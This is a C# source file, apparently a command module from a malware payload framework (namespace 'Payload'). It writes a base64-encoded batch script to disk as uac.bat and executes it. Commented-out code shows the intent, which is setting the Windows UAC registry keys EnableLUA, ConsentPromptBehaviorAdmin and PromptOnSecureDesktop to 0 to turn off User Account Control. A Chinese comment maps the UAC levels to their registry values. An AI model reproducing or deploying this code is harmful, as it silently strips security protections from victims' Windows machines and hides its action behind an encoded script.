using Microsoft.Win32;
using Payload.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Payload.Common.Config;
/*
1. UAC高
ConsentPromptBehaviorAdmin：2
EnableLUA：1
PromptOnSecureDesktop：1
2. UAC中
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：1
3. UAC低
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：0
4. UAC關閉
ConsentPromptBehaviorAdmin：0
EnableLUA：1
PromptOnSecureDesktop：0
*/
namespace Payload.Core.Command
{
    public class RegistryKeyCommand : Payload.Command.Interface.ICommand
    {
        public override Task Execute()
        {
            //OldCall();
            BatCall();
            return null;
        }

        void BatCall()
        {
            string batPath = Config.Instance.WorkSpaceDir + "\\uac.bat";

            using (StreamWriter writer = new StreamWriter(batPath))
            {
                writer.WriteLine(TextHelper.Base64Decode(TextHelper.UacBase64));
            }
            var p = new Process();
            p.StartInfo.FileName = batPath;
            p.Start();
        }

        void OldCall()
        {
            //string key = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
            //var rs = new RegistrySecurity();
            //RegistryKey uac = Registry.LocalMachine.CreateSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, rs);

            //if (uac == null)
            //{
            //    uac = Registry.LocalMachine.CreateSubKey(key);
            //}

            //if (Config.Instance.AppMode.Equals(EnumAppMode.DEBUG))
            //{
            //    uac.SetValue("EnableLUA", 1);
            //    uac.SetValue("ConsentPromptBehaviorAdmin", 2);
            //    uac.SetValue("PromptOnSecureDesktop", 1);
            //}
            //else
            //{
            //    uac.SetValue("EnableLUA", 0);
            //    uac.SetValue("ConsentPromptBehaviorAdmin", 0);
            //    uac.SetValue("PromptOnSecureDesktop", 0);
            //}

            //uac.Close();
        }
    }
}
